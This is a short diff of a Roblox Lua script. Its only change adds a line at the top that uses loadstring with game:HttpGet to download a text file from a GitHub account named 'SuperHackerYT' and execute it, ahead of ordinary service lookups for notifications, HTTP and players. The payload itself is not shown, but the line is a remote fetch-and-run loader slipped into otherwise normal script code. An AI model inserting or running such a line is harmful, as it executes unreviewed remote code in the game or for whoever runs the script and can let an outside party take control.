@@ -1,3 +1,5 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SuperHackerYT/skibidi/refs/heads/main/Extras.txt"))()
+
 local NotificationService = game:GetService("NotificationService")
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
